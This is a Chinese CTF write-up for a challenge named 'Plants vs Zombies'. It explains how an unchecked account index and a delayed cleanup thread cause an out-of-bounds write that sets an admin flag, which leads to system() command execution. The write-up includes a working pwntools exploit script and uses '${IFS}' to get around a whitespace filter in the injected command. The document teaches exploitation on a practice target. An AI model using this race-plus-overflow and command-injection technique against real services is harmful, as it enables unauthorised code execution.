# 植物大战僵尸

## 题目简述

程序把账户保存在全局数组 `list[0x30]` 中，紧随其后的全局变量 `trophy` 决定能否进入管理员模式：

```c
typedef struct chunk {
    char name[16];
    long score;
    long Flag;
} chunk;

unsigned int idx = 0;
chunk list[0x30];
int trophy = 0;
```

创建账户时 `idx` 没有边界检查；新线程会先 `sleep(1)`，之后才执行 `--idx` 和数组整理。只要在这一秒内连续创建足够多的账户，主线程就会让 `idx` 增长到 `0x30`，从而把 `list[0x30].name` 写到数组末尾之外，也就是 `trophy` 附近。

## 解题过程

漏洞的决定性代码为：

```c
void *handle(void *arg) {
    sleep(1);
    memset(&list[--idx], 0, 0x20);
    memmove(&list[idx], &list[idx + 1], 0x20);
    memset(&list[idx + 1], 0, 0x20);
    return NULL;
}

void account(void) {
    pthread_t tid;
    idx++;
    strncpy(list[idx].name, name, 0xf);
    list[idx].score = 0;
    list[idx].Flag = 0;
    pthread_create(&tid, NULL, handle, NULL);
}
```

合法下标为 0 至 47，但账户从 `list[1]` 开始写。当 `idx == 48` 时，`strncpy` 已越过整个 `list`，把名字开头的非零字节写入 `trophy`。这不是“线程把管理员标志随机覆盖”，而是无边界索引造成的确定性越界写；线程延迟只是提供了快速累积 `idx` 的竞态窗口。

管理员函数只检查 `trophy != 0`，随后把一个不含空白的字符串交给 `system`：

```c
if (!trophy)
    exit(-1);
scanf("%255s", command);
system(command);
```

因此先输入一个开头非零的名字，再把大量 `2` 和随后的 `3` 一次性送入输入缓冲，避免逐个等待菜单而错过一秒窗口。由于 `%s` 遇到空白就停止，读取 flag 的命令使用 `${IFS}` 代替空格：

```python
from pwn import *

HOST = args.HOST or "127.0.0.1"
PORT = int(args.PORT or 10000)

io = remote(HOST, PORT)
io.sendlineafter(b"Please input your name(<15)\n", b"A" * 15)

# 批量排入 stdin，使主线程在 handle 的 sleep(1) 结束前越界写到 trophy。
requests = b"2\n" * 0x50
requests += b"3\n"
requests += b"cat${IFS}flag\n"
io.send(requests)

io.interactive()
```

若远程调度导致竞态偶尔失败，重新连接执行即可；不应通过无限提高线程数量来消耗服务资源。

## 方法总结

利用链是“异步延迟回收 → `idx` 快速增长 → `list[0x30]` 越界覆盖 `trophy` → 管理员命令执行”。分析并发题时要区分竞态窗口和真正的内存破坏原语：这里的越界位置由数组布局决定，竞态只负责让索引在回收前越界。还要注意 `scanf("%s")` 不能直接读取带空格的 `cat flag`，可用 `${IFS}` 构造单个 shell 字符串。
